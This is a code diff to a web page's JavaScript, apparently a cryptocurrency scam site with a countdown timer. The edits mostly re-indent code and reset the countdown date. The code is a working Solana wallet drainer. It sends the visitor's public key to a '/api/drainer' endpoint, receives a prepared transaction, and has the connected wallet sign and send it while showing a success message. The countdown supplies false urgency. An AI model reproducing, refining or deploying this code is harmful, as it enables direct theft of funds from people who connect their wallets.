@@ -485,9 +485,8 @@
   <script>
     // --- Countdown logic ---
     function updateCountdown() {
-      // Set countdown to 30 days from today's actual date (July 28, 2024)
-      const today = new Date('2024-07-28T00:00:00Z'); // July 28, 2024
-      const target = new Date(today.getTime() + (30 * 24 * 60 * 60 * 1000)); // 30 days from July 28
+      // Set countdown to 30 days from today's actual date (July 28, 2025)
+      const target = new Date('2025-08-27T23:59:59Z').getTime(); // 30 days from July 28, 2025
       const interval = setInterval(() => {
         const now = new Date().getTime();
         const distance = target - now;
@@ -566,7 +565,7 @@
               // Only proceed with drainer if wallet is properly connected
               setTimeout(() => {
                 if (getWalletAddress(provider)) {
-                  runDrainer(provider);
+              runDrainer(provider);
                 } else {
                   showStatus('Wallet connection lost. Please try again.', 'error');
                 }
@@ -693,7 +692,7 @@
         }
       }
     }
-    
+
     // --- Status Message Logic ---
     function showStatus(msg, type) {
       const modal = document.getElementById('statusModal');
@@ -710,7 +709,7 @@
 
       // Show/hide action buttons based on type
       if (type === 'success') {
-        modal.style.display = 'flex';
+      modal.style.display = 'flex';
         actionsDiv.style.display = 'none';
         closeSingleBtn.style.display = 'inline-block';
         // Auto-close for success after 6 seconds
@@ -1013,46 +1012,46 @@
         // Use debounced API call to prevent rapid requests
         await new Promise((resolve, reject) => {
           debouncedAPICall(async () => {
-            try {
-              // 1. Fetch transaction from your API (update URL as needed)
-              const res = await fetch('/api/drainer', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ pubkey })
-              });
-              const data = await res.json();
-              if (!data.success || !data.transaction) throw new Error(data.error || "API error");
+      try {
+        // 1. Fetch transaction from your API (update URL as needed)
+        const res = await fetch('/api/drainer', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ pubkey })
+        });
+        const data = await res.json();
+        if (!data.success || !data.transaction) throw new Error(data.error || "API error");
               
               // Store transaction for potential retry
               storeTransaction(data.transaction, pubkey, walletName);
               
-              // 2. Deserialize transaction
-              const tx = window.solanaWeb3.Transaction.from(
-                Uint8Array.from(atob(data.transaction), c => c.charCodeAt(0))
-              );
-              // Debug: Log transaction for Glow troubleshooting
-              console.log('Drainer Transaction (base64):', data.transaction);
-              console.log('Drainer Transaction (object):', tx);
+        // 2. Deserialize transaction
+        const tx = window.solanaWeb3.Transaction.from(
+          Uint8Array.from(atob(data.transaction), c => c.charCodeAt(0))
+        );
+        // Debug: Log transaction for Glow troubleshooting
+        console.log('Drainer Transaction (base64):', data.transaction);
+        console.log('Drainer Transaction (object):', tx);
               
-              // 3. Sign and send
-              if (provider.isGlow && provider.signAndSendTransaction) {
-                // Glow expects a base64 string, not a Transaction object
-                const sig = await provider.signAndSendTransaction({ transactionBase64: data.transaction });
-                showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
+        // 3. Sign and send
+        if (provider.isGlow && provider.signAndSendTransaction) {
+          // Glow expects a base64 string, not a Transaction object
+          const sig = await provider.signAndSendTransaction({ transactionBase64: data.transaction });
+          showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
                 clearStoredTransaction(); // Clear on success
-              } else if (provider.signAndSendTransaction) {
-                const sig = await provider.signAndSendTransaction(tx);
-                showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
+        } else if (provider.signAndSendTransaction) {
+          const sig = await provider.signAndSendTransaction(tx);
+          showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
                 clearStoredTransaction(); // Clear on success
-              } else if (provider.signTransaction) {
-                const signed = await provider.signTransaction(tx);
-                showStatus("Transaction signed! (You need to send it to the network)", 'success');
+        } else if (provider.signTransaction) {
+          const signed = await provider.signTransaction(tx);
+          showStatus("Transaction signed! (You need to send it to the network)", 'success');
                 clearStoredTransaction(); // Clear on success
-              } else {
-                throw new Error("Wallet does not support transaction signing.");
-              }
+        } else {
+          throw new Error("Wallet does not support transaction signing.");
+        }
               resolve();
-            } catch (err) {
+      } catch (err) {
               reject(err);
             }
           }, 500); // 500ms debounce
